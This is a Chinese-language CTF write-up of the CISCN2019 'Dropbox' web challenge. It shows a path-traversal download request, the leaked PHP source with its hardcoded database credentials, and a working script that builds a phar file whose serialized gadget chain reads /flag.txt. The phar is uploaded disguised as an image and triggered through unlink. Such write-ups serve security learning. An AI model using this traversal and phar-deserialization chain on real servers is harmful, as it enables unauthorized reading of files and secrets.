---
title: '[CISCN2019 华北赛区 Day1 Web1]Dropbox'
date: 2024-06-08 17:12:07
tags: phar反序列化
categories: 刷题笔记
---

### [CISCN2019 华北赛区 Day1 Web1]Dropbox（phar反序列化）

我们打开页面，注册登录

我们发现可以上传文件

但只能上传图片

<!-- more -->

![image-20240608183356045](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081833202.png)

我们点击下载，进行抓包，发现filename这个参数可控，我们想到任意文件读取

![image-20240608183510516](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081835628.png)

由题目信息可知页面存在upload.php,delete.php,index,php

我们一个一个读取

```
filename=../../index.php
```

**index.php**

```
<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>


初始化FileList类，调用Name、Size方法

看到 Filelist中是不存在这两种方法的，于是调用了 __call魔术方法

__call方法：$this->results[$file->name()][$func] = $file->$func();results存储 File类对应方法的执行结果

最后当FileList对象销毁时，调用 __destruct魔术方法，打印出结果
```

**upload.php**

```
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

include "class.php";

if (isset($_FILES["file"])) {
    $filename = $_FILES["file"]["name"];
    $pos = strrpos($filename, ".");
    if ($pos !== false) {
        $filename = substr($filename, 0, $pos);
    }
    
    $fileext = ".gif";
    switch ($_FILES["file"]["type"]) {
        case 'image/gif':
            $fileext = ".gif";
            break;
        case 'image/jpeg':
            $fileext = ".jpg";
            break;
        case 'image/png':
            $fileext = ".png";
            break;
        default:
            $response = array("success" => false, "error" => "Only gif/jpg/png allowed");
            Header("Content-type: application/json");
            echo json_encode($response);
            die();
    }

    if (strlen($filename) < 40 && strlen($filename) !== 0) {
        $dst = $_SESSION['sandbox'] . $filename . $fileext;
        move_uploaded_file($_FILES["file"]["tmp_name"], $dst);
        $response = array("success" => true, "error" => "");
        Header("Content-type: application/json");
        echo json_encode($response);
    } else {
        $response = array("success" => false, "error" => "Invaild filename");
        Header("Content-type: application/json");
        echo json_encode($response);
    }
}
?>

```

**delete.php**

```
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>

```

我们可以看到delete.php和upload.php都包含了class.php这个文件，我们把它也读取出来

```
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">涓嬭浇</a> / <a href="#" class="delete">鍒犻櫎</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>

```

我们注意到在class.php，有个close方法可以进行文件包含

```
    public function close() {
        return file_get_contents($this->filename);
    }

```

我们找触发条件，在class.php中，有User类，其中__destruct()魔术方法，可以调用close()方法

```
    public function __destruct() {
        //调用close方法，但是该类没有close方法，所以是调用File类的close方法
        $this->db->close();
    }

```

但如果直接调用，不会回显，需要用到FileList类中的__call()魔术方法，将close()执行得到的信息放入生成test.phar的脚本

![image-20240608185833322](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081858467.png)

由于这里没有unserialize函数进行反序列化，我们可以用phar协议进行反序列化

```
<?php

class User {
    public $db;
}
class FileList {
    private $files;
    public function __construct()
    {
        $this->files = array(new File());
    }
}

class File {
    public $filename = '/flag.txt';
}
$a = new User();
$a->db = new FileList();

@unlink('test.phar');

$phar=new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($a);
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
?>

```

运行之后，我们可以发现在同级目录下生成了phar文件

![image-20240608184251665](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081842698.png)

在执行生成phar文件的脚本时候，如果无法正常执行，生成不了新的phar文件，需要修改php.ini中的配置。
在php.ini中，`phar.readonly`默认选项为On，无法生成phar文件要将php.ini中的`phar.readonly`选项设置为Off

我们进行上传，注意要修改文件后缀和type

![image-20240608184441793](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081844905.png)

![image-20240608184431005](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081844091.png)

由于class.php的delete方法中有unlink()，可以触发phar反序列化，我们点击删除抓包，用phar协议读取，得到flag

![image-20240608185135300](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406081851358.png)

### 知识点

**phar反序列化条件**

https://paper.seebug.org/680/

1. 有文件上传条件，可以上传phar文件

2. 可利用函数

   ![img](https://img-blog.csdnimg.cn/bcb7468d260b4c9eb6fde1ed4a701e41.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkIHNub3c=,size_20,color_FFFFFF,t_70,g_se,x_16)

   有如 `unlink、file_get_contents、isdir、file_exists`等函数

3. 文件操作函数的参数可控：upload.php中filename、delete.php中filename可控

4. 题目对`:`、`/`、`phar`等特殊字符没有过滤。



**phar结构由 4 部分组成**

 stub
phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；

 manifest
压缩文件的属性等信息，以序列化存储；

contents
压缩文件的内容；

 signature
签名，放在文件末尾；

这里有两个关键点：
一是文件标识，必须以__HALT_COMPILER();?>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；
二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。
